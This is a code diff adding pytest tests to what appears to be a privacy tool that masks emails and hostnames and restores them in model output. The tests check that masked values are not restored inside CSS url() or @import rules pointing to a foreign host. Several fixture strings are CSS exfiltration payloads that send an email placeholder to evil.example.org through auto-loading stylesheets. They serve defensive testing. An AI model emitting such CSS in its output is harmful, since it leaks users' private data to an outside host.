@@ -214,6 +214,45 @@ def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings,
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
 
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1>")}</style>',
+        "<style>a{background:url( 'https://evil.example.org/?q= <EMAIL_1>' )}</style>",
+        "a { background: URL(https://evil.example.org/?q= <EMAIL_1>) }",
+        '@font-face { src: url("https://evil.example.org/f?q=\\" <EMAIL_1>") }',
+        'b { background: url("https://evil.example.org/?q=\n<EMAIL_1>") }',
+        '@import "https://evil.example.org/?q= <EMAIL_1>";',
+        "@import url('https://evil.example.org/?q= <EMAIL_1>');",
+    ],
+)
+def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
+    """FINDINGS P2 «Restore: CSS url("…") with a space inside a style element»: адрес в url(…) и @import
+    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)»."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            '<style>a{background:url("https://host-1.domain-1.example/a b.png")}</style>',
+            '<style>a{background:url("https://srv-dc01.contoso.ru/a b.png")}</style>',
+        ),
+        ("a { background: url(img/<EMAIL_1>.png) }", "a { background: url(img/ivanov@contoso.ru.png) }"),
+        (
+            'a { background: url("https://evil.example.org/a.png") } /* автор <EMAIL_1> */',
+            'a { background: url("https://evil.example.org/a.png") } /* автор ivanov@contoso.ru */',
+        ),
+    ],
+)
+def test_own_and_nearby_css_urls_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш и относительный адрес в url() восстанавливаются, метка
+    рядом с чужим url() — тоже."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
 def test_own_link_in_an_attribute_is_still_restored(settings):
     result = restore(link_state(), '<a href="https://host-1.domain-1.example/?q=<EMAIL_1>">', settings)
     assert result.text == '<a href="https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru">'
